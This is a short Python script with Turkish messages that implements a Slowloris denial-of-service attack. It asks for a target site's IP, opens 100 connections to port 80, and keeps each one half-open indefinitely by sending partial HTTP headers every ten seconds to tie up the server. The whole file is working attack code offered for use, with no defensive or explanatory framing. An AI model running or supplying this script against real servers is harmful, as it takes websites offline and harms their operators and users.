import socket
import random
import time

print("--- SLOWLORIS DOS ATTACK ---")
target_ip = input("Hedef Site IP: ")
port = 80
socket_count = 100
list_of_sockets = []

print(f"[*] {socket_count} adet zehirli bağlantı hazırlanıyor...")

for _ in range(socket_count):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target_ip, port))
        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
        s.send("User-Agent: Mozilla/5.0\r\n".encode("utf-8"))
        list_of_sockets.append(s)
    except: pass

print(f"🔥 Saldırı Başladı! Sunucu meşgul ediliyor...")

while True:
    print(f"[*] Bağlantılar canlı tutuluyor: {len(list_of_sockets)}")
    for s in list(list_of_sockets):
        try:
            s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
        except:
            list_of_sockets.remove(s)
    time.sleep(10)